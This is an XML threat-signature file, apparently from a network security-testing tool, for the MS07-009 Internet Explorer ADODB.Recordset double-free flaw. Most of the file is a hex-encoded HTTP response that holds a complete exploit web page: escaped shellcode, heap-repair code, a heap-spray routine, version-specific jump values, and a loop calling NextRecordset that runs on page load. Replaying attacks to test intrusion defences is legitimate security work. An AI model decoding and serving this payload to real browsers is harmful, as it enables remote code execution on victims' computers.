<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Internet Explorer ADODB.Recordset Double Free Memory Exploit (ms07-009)"/>
    <EngDesc display="true" value="This threat uses malicious javascript to leverage a flaw in the NextRecordset() (msado15.dll) function. Internet Explorer is a web browser that connects to web servers typically listening on port 80."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
      <item value="Denial_of_Service"/>
      <item value="Command_Injection"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
      <item value="Web_Browser"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Internet_Explorer"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Internet_Explorer_6.0_SP1"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.milw0rm.com/exploits/3577"/>
    <CVEID display="true" value="CVE-2006-5559"/>
    <bugtraqID display="true" value="20704"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="315827ac586da352d155482dd75f2b0f"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="true"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="633105650927968750"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1175219775" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
    </for>
    <for index="B"/>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203237204D617220323030372032323A35363A333920474D540D0A5365727665723A204170616368650D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D69736F2D383835392D310D0A0D0A3C48544D4C3E0D0A3C484541443E0D0A093C4F424A4543542069643D6F626A20636C61737369643D636C7369643A30303030303533352D303030302D303031302D383030302D3030414130303644324541343E3C2F4F424A4543543E0D0A3C2F484541443E0D0A0D0A3C424F4459206F6E4C6F61643D27476F2829273E0D0A0D0A3C736372697074206C616E67756167653D6A6176617363726970743E0D0A0D0A2F2F2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5265706C616365207769746820796F757220636F64652D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2F2F0D0A09766172205368656C6C636F6465203D20756E657363617065282225754538464325753030343425753030303025753435384225753842334325753035374325753031373825753842454625753138344625753546384225753031323025753439454225753334384225753031384225753331454525753939433025753834414325753734433025754331303725753044434125754332303125754634454225753534334225753034323425754535373525753546384225753031323425753636454225753043384225753842344225753143354625754542303125753143384225753031384225753839454225753234354325754333303425754330333125753842363425753330343025754330383525753043373825753430384225753842304325753143373025753842414425753038363825753039454225753830384225753030423025753030303025753638384225753546334325754636333125753536363025754638383925754330383325753530374225753745363825754532443825753638373325754645393825753045384125754646353725753633453725753643363125753030363322293B0D0A2F2F2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5265706C616365207769746820796F757220636F64652D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2F2F0D0A0D0A0D0A2F2F2D2D2D2D2D2D2D2D2D2D2D2D2D486561702052657061697220436F64652E20446F206E6F74205265706C6163652D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2F2F0D0A09097661722048656170526570616972436F6465203D20756E657363617065282225753930393025753930393025753138364125753634354225753033384225753430384225753842333025753138343025753538303525753030303125753333303025753839443225753839313025753034353025753530383925753839303825753043353025754330383325753839323825753839303025753034343025754330383325753636303825753738334425753743303525753842463225753831443825753930433325753030303025753839303025753333313825753833443225753034433025753130383925754330383325753831303425753830433325753030303025753839303025753333313825753839433025753833303325753034433325753831363625753838464225753743314525753842463425753831443325753730454225753030314525753636303025753333384225753839363625753432333225754336343225753038303225753636343225753332384225753331363625753432333225754336343225753134303225753636343225753332384225753331363625753432333225753636343225754333383125753031363025753133383925753533383925753839303425753839314125753034354125753930393022293B0D0A2F2F2D2D2D2D2D2D2D2D2D2D2D2D2D486561702052657061697220436F64652E20446F206E6F74205265706C6163652D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2F2F0D0A0D0A766172207061727431203D2027273B0D0A766172207061727432203D2027273B0D0A76617220706172744C656E203D203132373B0D0A0D0A66756E6374696F6E20507265704D656D28290D0A7B0D0A2F2F5374616E64617264204865617020537072617920436F64650D0A76617220686561705370726179546F41646472657373203D20307830353035303530353B0D0A0D0A09766172207061794C6F6164436F6465203D2048656170526570616972436F6465202B205368656C6C636F64653B0D0A097661722068656170426C6F636B53697A65203D2030783430303030303B0D0A09766172207061794C6F616453697A65203D207061794C6F6164436F64652E6C656E677468202A20323B0D0A09766172207370726179536C69646553697A65203D2068656170426C6F636B53697A65202D20287061794C6F616453697A652B30783338293B0D0A09766172207370726179536C696465203D20756E657363617065282225753930393025753930393022293B0D0A097370726179536C696465203D206765745370726179536C696465287370726179536C6964652C7370726179536C69646553697A65293B0D0A0968656170426C6F636B73203D2028686561705370726179546F41646472657373202D203078343030303030292F68656170426C6F636B53697A653B0D0A096D656D6F7279203D206E657720417272617928293B0D0A0D0A09666F722028693D303B693C68656170426C6F636B733B692B2B290D0A097B0D0A09096D656D6F72795B695D203D207370726179536C696465202B207061794C6F6164436F64653B0D0A097D0D0A0D0A0966756E6374696F6E206765745370726179536C696465287370726179536C6964652C207370726179536C69646553697A65290D0A097B0D0A09097768696C6520287370726179536C6964652E6C656E6774682A323C7370726179536C69646553697A65290D0A09097B0D0A0909097370726179536C696465202B3D207370726179536C6964653B0D0A09097D0D0A09097370726179536C696465203D207370726179536C6964652E737562737472696E6728302C7370726179536C69646553697A652F32293B0D0A090972657475726E207370726179536C6964653B0D0A097D0D0A7D0D0A0D0A0D0A66756E6374696F6E2047657453797374656D56657273696F6E28290D0A7B0D0A202F2F53696D706C6520446574656374696E67206F66204F532076657273696F6E206F7574206F66204A7363726970742076657273696F6E3A0D0A09090D0A09097661722020766572203D2022223B0D0A0909766572202B3D20536372697074456E67696E654D616A6F7256657273696F6E28293B0D0A0909766572202B3D20536372697074456E67696E654D696E6F7256657273696F6E28293B0D0A0909766572202B3D20536372697074456E67696E654275696C6456657273696F6E28293B0D0A09090D0A09096966200928207665723C35363838323020297B2072657475726E282270726553503222293B207D0D0A0909656C73652069662028207665723C35373537333020297B2072657475726E282253503222293B207D0D0A0909656C73652072657475726E202830293B0D0A7D0D0A0D0A0D0A66756E6374696F6E20507265704A6D70636F6465287370290D0A7B0D0A09737769746368287370297B0D0A090909636173652022707265535032223A0D0A09090909090D0A0909090909766172206567673D22223B0D0A09090909096567672B3D756E657363617065282225753036303825753030313422293B09090D0A09090909096567672B3D756E657363617065282225753030303025753030303022293B0D0A09090909096567672B3D756E657363617065282225754637303825753030313322293B09090D0A09090909096567672B3D756E657363617065282225753030303025753031303122293B0D0A09090909096567672B3D756E657363617065282225754646464625754646464622293B0D0A09090909096567672B3D756E657363617065282225754646464625754646464622293B0D0A09090909090D0A090909090970617274312B3D756E657363617065282225753034303025753030313422293B090D0A090909090970617274312B3D756E657363617065282225753332304325753737464322293B090D0A09090909097768696C65202870617274312E6C656E6774683C706172744C656E29207B70617274312B3D756E657363617065282225753035303522293B7D2F2F207074722A207368656C6C636F6465090909090909090D0A09090909090D0A09090909097768696C65202870617274322E6C656E6774683C28706172744C656E2D6567672E6C656E6774682929207B70617274322B3D756E657363617065282225754646464622293B7D0D0A090909090970617274322B3D6567673B0909090909090D0A09090909090D0A0909090909627265616B3B090D0A0D0A09090D0A090909636173652022535032223A0D0A09090909090D0A0909090909766172206567673D22223B0D0A09090909096567672B3D756E657363617065282225753036303825753030313422293B09090D0A09090909096567672B3D756E657363617065282225753030303025753030303022293B0D0A09090909096567672B3D756E657363617065282225754637303825753030313322293B09090D0A09090909096567672B3D756E657363617065282225753030303025753031303122293B09090D0A09090909096567672B3D756E657363617065282225754646464625754646464622293B0D0A09090909096567672B3D756E657363617065282225754646464625754646464622293B0D0A09090909090D0A090909090970617274312B3D756E657363617065282225753035303525753035303522293B090D0A090909090970617274312B3D756E657363617065282225756531323825753735633722293B090D0A09090909097768696C65202870617274312E6C656E6774683C706172744C656E29207B70617274312B3D756E657363617065282225754646464622293B7D09090909090909090D0A09090909090D0A09090909097768696C65202870617274322E6C656E6774683C28706172744C656E2D6567672E6C656E6774682929207B70617274322B3D756E657363617065282225754646464622293B7D0D0A090909090970617274322B3D6567673B0909090909090D0A09090909090D0A0909090909627265616B3B090D0A09097D0D0A7D0D0A0D0A66756E6374696F6E204578706C6F697428290D0A7B0D0A0909766172206172723D6E657720417272617928293B0D0A090976617220693D313B0D0A09090D0A09097768696C6528693C353030297B0D0A090909097472797B0D0A090909096B3D313B0D0A090909097768696C65286B3C353030297B206172725B6B5D3D70617274312B70617274323B206B2B2B3B207D0D0A090909096F626A2E4E6578745265636F7264736574282070617274312B706172743220293B0D0A090909097D63617463682865297B7D0D0A09090909692B2B3B0D0A09090909097D0D0A7D0D0A0D0A66756E6374696F6E20476F28297B0D0A09507265704D656D28293B0D0A09507265704A6D70636F6465282047657453797374656D56657273696F6E282920293B0D0A094578706C6F697428293B0D0A7D0D0A0D0A3C2F7363726970743E0D0A3C2F626F64793E0D0A3C2F68746D6C3E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
